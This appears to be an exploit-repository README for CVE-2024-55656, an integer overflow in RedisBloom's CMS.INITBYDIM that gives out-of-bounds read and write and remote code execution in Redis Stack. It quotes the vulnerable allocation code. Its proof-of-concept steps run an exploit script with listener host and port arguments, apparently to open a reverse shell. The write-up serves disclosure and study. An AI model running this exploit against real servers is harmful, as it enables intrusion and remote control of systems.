### CVE-2024-55656 - Redis Stack - RedisBloom Integer Overflow Remote Code Execution Vulnerability

* Title: Redis Stack RedisBloom Integer Overflow Remote Code Execution Vulnerability
* ZDI: ZDI-25-009
* CVE: CVE-2024-55656
* Credits: rick2600 and gqsilva
* CVSS: 8.8 (HIGH)
* Affected version: RedisBloom v2.6.12 shipped with Redis Stack 7.2.0-v10

### Analysis (Short Version)
There is an integer overflow vulnerability in RedisBloom (https://github.com/RedisBloom/RedisBloom), which is a module used in redis (https://redis.io/docs/latest/develop/data-types/probabilistic/bloom-filter/). The integer overflow vulnerability allows an attacker (a redis client which knows the password) to allocate memory in the heap lesser than the required memory due to wraparound. Then read and write can be performed beyond this allocated memory, leading to info leak and OOB write.

The integer overflow is in CMS.INITBYDIM command, which initialize a Count-Min Sketch to dimensions specified by user. It accepts two values (width and depth) and uses them to allocate memory in NewCMSketch()

File: src/cms.c

```c
CMSketch *NewCMSketch(size_t width, size_t depth) {
    assert(width > 0);
    assert(depth > 0);

    CMSketch *cms = CMS_CALLOC(1, sizeof(CMSketch));

    cms->width = width;
    cms->depth = depth;
    cms->counter = 0;
    cms->array = CMS_CALLOC(width * depth, sizeof(uint32_t));

    return cms;
}
```

OOB read is achieved through CMS.QUERY command implemented in CMS_Query(). 

OOB write is achieved through CMS.INCRBY command implemented in CMS_IncrBy().

For full analysis check the [advisory](https://github.com/RedisBloom/RedisBloom/security/advisories/GHSA-x5rx-rmq3-ff3h)

### Proof-of-Concept

1. Start redis-stack
   
`docker run -p 6379:6379 --name redis-stack redis/redis-stack:7.2.0-v10`

2. Run the exploit
   
`python exploit.py --host 172.17.0.2 --port 6379 --lhost 172.17.0.1 --lport 4444`


### References
1. https://www.zerodayinitiative.com/advisories/ZDI-25-009/
2. https://github.com/RedisBloom/RedisBloom/security/advisories/GHSA-x5rx-rmq3-ff3h
3. https://redis.io/blog/security-advisory-cve-2024-46981-cve-2024-51737-cve-2024-51480-cve-2024-55656/
